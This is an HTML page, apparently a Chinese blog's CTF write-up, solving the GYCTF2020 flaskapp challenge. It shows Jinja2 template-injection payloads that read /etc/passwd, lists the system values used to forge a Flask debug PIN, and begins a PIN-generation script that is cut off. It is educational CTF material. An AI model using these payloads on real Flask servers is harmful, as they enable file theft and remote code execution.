@@ -1,0 +1,638 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          buuctf刷题——Python - ca01h&#39;s Blog
+        
+    </title>
+
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+	
+<link rel="stylesheet" href="/css/fontawesome/all.css">
+
+	
+<script src="/js/fontawesome/all.js"></script>
+
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="ca01h's Blog" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+<body>
+
+<!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>CA01H&#39;S BLOG</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <h1 id="文章归档"><a href="/archives/index.html"><strong>文章归档</strong></a></h1>
+<h1 id="置顶文章"><strong>置顶文章</strong></h1>
+<ul>
+<li><a href="/Other/6.Linux-Enumeration">Linux Enumeration</a></li>
+</ul>
+<h1 id="Web安全"><strong>Web安全</strong></h1>
+<h2 id="Web安全基础">Web安全基础</h2>
+<ul>
+<li><a href="/Web_security/basic_learning/1.%E5%9C%A8Ubuntu18.04%E5%AE%89%E8%A3%85LNMP">在Ubuntu18.04安装LNMP</a></li>
+<li><a href="/Web_security/basic_learning/2.MySQL%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C">MySQL数据库基本操作</a></li>
+<li><a href="/Web_security/basic_learning/3.MySQL%E7%9A%84%E7%B3%BB%E7%BB%9F%E8%A1%A8%E3%80%81%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E5%92%8CHash%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4">MySQL的系统表、文件读写</a></li>
+<li><a href="/Web_security/basic_learning/4.%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0">数据库系统功能相关学习</a></li>
+<li><a href="/Web_security/basic_learning/5.%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0">数据库注入语句的收集和学习</a></li>
+<li><a href="/Web_security/basic_learning/6.Web%E9%A1%B5%E9%9D%A2%E8%A7%A3%E6%9E%90%E7%9A%84%E6%B5%81%E7%A8%8B%E5%AD%A6%E4%B9%A0">Web页面解析的流程学习</a></li>
+<li><a href="/Web_security/basic_learning/7.%E5%90%84%E7%A7%8D%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E7%9A%84%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%92%8C%E4%BB%A3%E7%A0%81%E7%BC%96%E5%86%99">各种注入类型的环境搭建和代码编写</a></li>
+<li><a href="/Web_security/basic_learning/9.Sqli-labs%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94Basic-Challenge">Sqli-labs手工注入(一)</a></li>
+<li><a href="/Web_security/basic_learning/8.Sqli-labs%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94Advanced-Injections">Sqli-labs手工注入(二)</a></li>
+<li><a href="/Web_security/basic_learning/10.SQLMap%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0">SQLMap入门学习</a></li>
+<li><a href="/Web_security/basic_learning/11.SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5">SQL注入——双查询注入</a></li>
+<li><a href="/Web_security/basic_learning/12.XSS%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0">XSS漏洞实战学习</a></li>
+<li><a href="/Web_security/basic_learning/13.%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">文件包含漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/14.%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">变量覆盖漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/16.%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">文件上传漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/17.SSRF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">SSRF漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/18.%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">命令执行漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/19.%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">逻辑漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/20.xxe%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">XXE漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/21.NoSQL%E6%B3%A8%E5%85%A5%E4%B9%8BMongoDB">NoSQL注入之MongoDB</a></li>
+<li><a href="/Web_security/basic_learning/22.SQL%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E4%B9%8BMySQL%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E8%AF%AD%E6%B3%95">SQL注入专项之MySQL基本注入语法</a></li>
+<li><a href="/Web_security/basic_learning/24.%E6%B5%85%E8%B0%88LDAP%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB">浅谈LDAP注入攻击</a></li>
+</ul>
+<h2 id="PHP相关">PHP相关</h2>
+<ul>
+<li><a href="/Web_security/php_related/1.PHP%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8">PHP回调后门</a></li>
+<li><a href="/Web_security/php_related/2.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E7%A1%80%E7%AF%87">PHP反序列化——基础篇</a></li>
+<li><a href="/Web_security/php_related/3.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">PHP反序列化——Phar</a></li>
+<li><a href="/Web_security/php_related/4.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">PHP反序列化——Session</a></li>
+<li><a href="/Web_security/php_related/5.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8">PHP反序列化-原生类利用</a></li>
+<li><a href="/Web_security/php_related/8.PHP%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E6%9E%84%E9%80%A0webshell">PHP无数字字母构造webshell</a></li>
+<li><a href="/Web_security/php_related/9.%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0PHP%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8">PHP无参数函数的利用</a></li>
+<li><a href="/Web_security/php_related/10.%E5%88%A9%E7%94%A8SoapClient%E7%B1%BB%E8%BF%9B%E8%A1%8CSSRF-CRLF%E6%94%BB%E5%87%BB">SoapClient+SSRF+CRLF利用</a></li>
+<li><a href="/Web_security/php_related/12.PHP%E7%9A%84LFI%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93">PHP LFI to RCE</a></li>
+</ul>
+<h2 id="Writeups">Writeups</h2>
+<ul>
+<li><a href="/Web_security/ctf_writeup/3.CGCTF-Writeup">CGCTF-Writeup</a></li>
+<li><a href="/Web_security/ctf_writeup/4.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">BUUCTF—PHP代审</a></li>
+<li><a href="/Web_security/ctf_writeup/5.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E7%AF%87">BUUCTF—PHP框架漏洞</a></li>
+<li><a href="/Web_security/ctf_writeup/6.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">BUUCTF—PHP反序列化</a></li>
+<li><a href="/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5">BUUCTF—SQL注入</a></li>
+<li><a href="/Web_security/ctf_writeup/8.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94XSS">BUUCTF—XSS</a></li>
+<li><a href="/Web_security/ctf_writeup/9.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SSRF">BUUCTF—SSRF</a></li>
+<li><a href="/Web_security/ctf_writeup/10.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">BUUCTF—命令执行</a></li>
+<li><a href="/Web_security/ctf_writeup/11.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">BUUCTF—文件上传</a></li>
+<li><a href="/Web_security/ctf_writeup/12.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">BUUCTF—文件包含</a></li>
+<li><a href="/Web_security/ctf_writeup/13.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Python">BUUCTF—Python</a></li>
+<li><a href="/Web_security/ctf_writeup/14.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94NodeJS">BUUCTF—NodeJS</a></li>
+<li><a href="/Web_security/ctf_writeup/15.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Ruby%E5%8F%8AGo">BUUCTF—Ruby和Go</a></li>
+<li><a href="/Web_security/ctf_writeup/16.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AF%87">BUUCTF—渗透测试</a></li>
+<li><a href="/Web_security/ctf_writeup/17.2020%E7%94%B5%E4%BF%A1%E5%A4%A9%E7%BF%BC%E6%9D%AFCTF%E2%80%94APITest">2020电信天翼杯CTF—APITest</a></li>
+<li><a href="/Web_security/ctf_writeup/18.%E6%98%9F%E7%9B%9F6%E6%9C%88AWD%E5%A4%8D%E7%9B%98%E2%80%94%E2%80%94web+pwn">星盟6月AWD Web+Pwn</a></li>
+<li><a href="/Web_security/ctf_writeup/19.DASCTF2020%E4%B8%83%E6%9C%88%E8%B5%9B">DASCTF2020七月赛 Web</a></li>
+<li><a href="/Web_security/ctf_writeup/20.CSICTF2020">CSICTF2020 Web+Linux</a></li>
+<li><a href="/Web_security/ctf_writeup/21.2020%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9BCTF-Web">2020第五空间CTF Web</a></li>
+<li><a href="/Web_security/ctf_writeup/22.%E9%A6%96%E5%B1%8A%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AFCTF">首届钓鱼城杯CTF</a></li>
+<li><a href="/Web_security/ctf_writeup/23.DASCTF2020%E5%85%AB%E6%9C%88%E8%B5%9B">DASCTF八月赛</a></li>
+</ul>
+<h1 id="靶机系列"><strong>靶机系列</strong></h1>
+<h2 id="HackTheBox">HackTheBox</h2>
+<ul>
+<li><a href="/Target_drone/HackTheBox/1.HTB-OpenAdmin-walkthrough">HTB::OpenAdmin</a></li>
+<li><a href="/Target_drone/HackTheBox/2.HTB-Postman-walkthrough">HTB::Postman</a></li>
+<li><a href="/Target_drone/HackTheBox/3.HTB-Traverxec-walkthrough">HTB::Traverxec</a></li>
+<li><a href="/Target_drone/HackTheBox/4.HTB-Obscurity-walkthrough">HTB::Obscurity</a></li>
+<li><a href="/Target_drone/HackTheBox/5.HTB-Mongo-walkthrough">HTB::Mongo</a></li>
+<li><a href="/Target_drone/HackTheBox/6.HTB-Tenten-walkthrough">HTB::Tenten</a></li>
+<li><a href="/Target_drone/HackTheBox/7.HTB-Sneaky-walkthrough">HTB::Sneaky</a></li>
+<li><a href="/Target_drone/HackTheBox/8.HTB-Teacher-walkthrough">HTB::Teacher</a></li>
+<li><a href="/Target_drone/HackTheBox/9.HTB-Irked-walkthrough">HTB::Irked</a></li>
+<li><a href="/Target_drone/HackTheBox/10.HTB-Traceback-walkthrough">HTB::Traceback</a></li>
+<li><a href="/Target_drone/HackTheBox/11.HTB-DevOops-walkthrough">HTB::DevOops</a></li>
+<li><a href="/Target_drone/HackTheBox/12.HTB-Blocky-walkthrough">HTB::Blocky</a></li>
+<li><a href="/Target_drone/HackTheBox/13.HTB-Beep-walkthrough">HTB::Beep</a></li>
+<li><a href="/Target_drone/HackTheBox/14.HTB-Book-walkthrough">HTB::Book</a></li>
+<li><a href="/Target_drone/HackTheBox/16.HTB-Craft-walkthrough">HTB::Craft</a></li>
+<li><a href="/Target_drone/HackTheBox/17.HTB-CTF-walkthrough">HTB::CTF</a></li>
+<li><a href="/Target_drone/HackTheBox/15.HTB-Magic-walkthrough">HTB::Magic</a></li>
+</ul>
+<h2 id="VulnHub">VulnHub</h2>
+<ul>
+<li><a href="/Target_drone/VulnHub/1.VulnHub-BossplayersCTF-walkthrough">VulnHub::BossplayersCTF</a></li>
+<li><a href="/Target_drone/VulnHub/2.VulnHub-DC-1-walkthrough">VulnHub::DC-1</a></li>
+<li><a href="/Target_drone/VulnHub/3.VulnHub-DigitalWorld-Local-JOY-walkthrough">VulnHub::DigitalWorld:JOY</a></li>
+</ul>
+<h1 id="代码审计"><strong>代码审计</strong></h1>
+<h2 id="PHP代码审计">PHP代码审计</h2>
+<ul>
+<li><a href="/code_audit/3.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day1">PHP代码审计学习—Day1</a></li>
+<li><a href="/code_audit/4.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day2">PHP代码审计学习—Day2</a></li>
+<li><a href="/code_audit/5.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day3">PHP代码审计学习—Day3</a></li>
+<li><a href="/code_audit/6.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day4">PHP代码审计学习—Day4</a></li>
+<li><a href="/code_audit/7.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day5">PHP代码审计学习—Day5</a></li>
+<li><a href="/code_audit/1.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0%E2%80%94%E2%80%94yixuncms">PHP代码审计复现—yixuncms</a></li>
+<li><a href="/code_audit/2.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0%E2%80%94%E2%80%94chinaz">PHP代码审计复现—chinaz</a></li>
+</ul>
+<h1 id="流量分析"><strong>流量分析</strong></h1>
+<ul>
+<li><a href="/Web_security/traffic_analysis/1.Datacon2019-q1-Writeup-v1">Datacon2019-q1-wp-v1</a></li>
+<li><a href="/Web_security/traffic_analysis/2.Datacon2019-q1-Writeup-v2">Datacon2019-q1-wp-v2</a></li>
+<li><a href="/Web_security/traffic_analysis/3.Bro%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">Bro语法学习之基础知识</a></li>
+</ul>
+<h1 id="机器学习"><strong>机器学习</strong></h1>
+<h2 id="基础学习">基础学习</h2>
+<ul>
+<li><a href="/Machine_learning/basic_learning/1.Machine-Learning-Week1">Machine-Learning-Week1</a></li>
+<li><a href="/Machine_learning/basic_learning/2.Machine-Learning-Week2">Machine-Learning-Week2</a></li>
+<li><a href="/Machine_learning/basic_learning/3.Machine-Learning-Week3">Machine-Learning-Week3</a></li>
+<li><a href="/Machine_learning/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E7%9A%84%E8%B5%84%E6%96%99%EF%BC%88%E8%BD%AC%EF%BC%89">机器学习与网络安全相关的资料（转）</a></li>
+</ul>
+<h1 id="Python"><strong>Python</strong></h1>
+<h2 id="Python编程">Python编程</h2>
+<ul>
+<li>
+<p><a href="/Python/code/1.Python%E5%87%BD%E6%95%B0%E7%9A%84%E5%8F%82%E6%95%B0">Python函数的参数</a></p>
+</li>
+<li>
+<p><a href="/Python/code/2.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%AB%98%E9%98%B6%E5%87%BD%E6%95%B0">Python函数式编程之高阶函数</a></p>
+</li>
+<li>
+<p><a href="/Python/code/3.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B-%E9%97%AD%E5%8C%85">Python函数式编程-闭包</a></p>
+</li>
+<li>
+<p><a href="/Python/code/4.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B-%E8%A3%85%E9%A5%B0%E5%99%A8">Python函数式编程-装饰器</a></p>
+</li>
+<li>
+<p><a href="/Python/code/5.Python%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B%E4%B9%8Bslots%E3%80%81@property%E5%92%8C%E5%A4%9A%E9%87%8D%E7%BB%A7%E6%89%BF">Python面向对象高级编程之slots、@property和多重继承</a></p>
+</li>
+<li>
+<p><a href="/Python/code/6.PythonIO%E7%BC%96%E7%A8%8B">PythonIO编程</a></p>
+</li>
+</ul>
+<h1 id="Java"><strong>Java</strong></h1>
+<h2 id="Java编程">Java编程</h2>
+<ul>
+<li><a href="/Java/code/1.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8BJDK%E3%80%81JRE%E3%80%81JVM">Java基础学习之JDK、JRE、JVM</a></li>
+<li><a href="/Java/code/2.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%A0%B8%E5%BF%83%E7%B1%BB">Java基础学习之核心类</a></li>
+<li><a href="/Java/code/3.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%9F%BA%E7%A1%80">Java基础学习之面向对象基础</a></li>
+<li><a href="/Java/code/4.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86">Java基础学习之异常处理</a></li>
+</ul>
+<h1 id="算法"><strong>算法</strong></h1>
+<h2 id="Leetcode">Leetcode</h2>
+<ul>
+<li><a href="/Algorithm/1.Leetcode-Primary-class">Leetcode-Primary-class</a></li>
+</ul>
+<h1 id="随笔"><strong>随笔</strong></h1>
+<h2 id="经验">经验</h2>
+<ul>
+<li><a href="/Essay/%E4%BB%8E0%E5%88%B0100%E5%88%86%E7%9A%84%E8%B7%AF%E7%A8%8B%E2%80%94%E2%80%94%E5%86%99%E5%9C%A82019%E5%B9%B4%E7%9A%84%E6%9C%80%E5%90%8E%E4%B8%80%E5%A4%A9">从0到100分的路程——写在2019年的最后一天</a></li>
+</ul>
+<h2 id="技术">技术</h2>
+<ul>
+<li><a href="/Other/1.%E9%98%BF%E9%87%8C%E4%BA%91Centos7-Ngnix%E9%83%A8%E7%BD%B2Hexo">阿里云Centos7-Ngnix部署Hexo</a></li>
+<li><a href="/Other/2.%E9%98%BF%E9%87%8C%E4%BA%91OSS-PicGo%E6%90%AD%E5%BB%BAMarkdown%E5%9B%BE%E5%BA%8A">阿里云OSS-PicGo搭建Markdown图床</a></li>
+<li><a href="/Other/3.Hexo%E6%B8%B2%E6%9F%93LaTeX%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F">Hexo渲染LaTeX数学公式</a></li>
+<li><a href="/Other/4.git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE">Git CheatSheet</a></li>
+<li><a href="/Other/5.Tmux%E5%BF%AB%E6%8D%B7%E9%94%AE%E5%A4%87%E5%BF%98%E5%BD%95">Tmux CheatSheet</a></li>
+</ul>
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
+  <div class="sidebar-toggle-inner"></div>
+</div>
+
+<script>
+function add_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.add('show')  
+}
+
+function remove_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.remove('show')
+}
+
+function sidebar_toggle() {
+    let sidebar_toggle = document.querySelector('.sidebar-toggle')
+    let sidebar = document.querySelector('.book-sidebar')
+    let content = document.querySelector('.off-canvas-content')
+    if (sidebar_toggle.classList.contains('extend')) { // show
+        sidebar_toggle.classList.remove('extend')
+        sidebar.classList.remove('hide')
+        content.classList.remove('extend')
+    }
+    else { // hide
+        sidebar_toggle.classList.add('extend')
+        sidebar.classList.add('hide')
+        content.classList.add('extend')
+    }
+}
+</script>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="book-post">
+  
+  <i class="fas fa-calendar-day"></i>&nbsp;2020-08-18&nbsp;
+  <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span><span> times</span>&nbsp;
+  <i class="fas fa-file-word"></i>&nbsp;<span class="post-count">3.8k</span>
+  
+  <h1 id="BUUCTF刷题——Python">BUUCTF刷题——Python</h1>
+<h2 id="GYCTF2020-flaskapp">GYCTF2020 flaskapp</h2>
+<h3 id="考点">考点</h3>
+<ul>
+<li>
+<p>Flask debug pin码安全</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2553">https://xz.aliyun.com/t/2553</a></p>
+</li>
+</ul>
+<h3 id="解题">解题</h3>
+<p>打开题目有一个hint界面，查看源码</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200706152201.png" alt=""></p>
+<p>意思应该是去伪造Flask pin然后执行命令。</p>
+<p>先来验证一下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[0].__init__&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200706160510.png" alt=""></p>
+<p>然后还要找到一个读文件的payload，发现eval不能用，用open可以读</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;open&#39;](&quot;&#x2F;etc&#x2F;passwd&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200706160627.png" alt=""></p>
+<p>接下来就是要获取6个关键参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">username # 用户名</span><br><span class="line"></span><br><span class="line">modname # flask.app</span><br><span class="line"></span><br><span class="line">getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;)) # Flask</span><br><span class="line"></span><br><span class="line">getattr(mod, &#39;__file__&#39;, None) # flask目录下的一个app.py的绝对路径</span><br><span class="line"></span><br><span class="line">uuid.getnode() # mac地址十进制</span><br><span class="line"></span><br><span class="line">get_machine_id() # &#x2F;etc&#x2F;machine-id</span><br></pre></td></tr></table></figure>
+<p>第一个用户名可以通过<code>/etc/passwd</code>得到，即<code>flaskweb</code></p>
+<p>第二个modname一般都是默认的flask.app</p>
+<p>第三个也是默认的Flask</p>
+<p>第四个是<code>app.py</code>的绝对路径，可以直接通过报错来获取</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200706161050.png" alt=""></p>
+<p>第四个mac地址如果在真实环境是从<code>/etc/machine-id</code>文件读取，如果是在docker下，是从<code>/sys/class/net/eth0/address</code>目录下读取，转换成十进制<code>2485410468126</code></p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200706161305.png" alt=""></p>
+<blockquote>
+<p>转换地址：<a target="_blank" rel="noopener" href="https://www.vultr.com/resources/mac-converter/">https://www.vultr.com/resources/mac-converter/</a></p>
+</blockquote>
+<p>第五个通过读取<code>/proc/self/cgroup</code>获取machine-id：1408f836b0ca514d796cbf8960e45fa1</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200706163205.png" alt=""></p>
+<p>然后再上脚本跑出PIN码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#脚本出处：https://xz.aliyun.com/t/2553</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;flaskweb&#x27;</span>,<span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> </span><br><span class="line">]</span><br><span 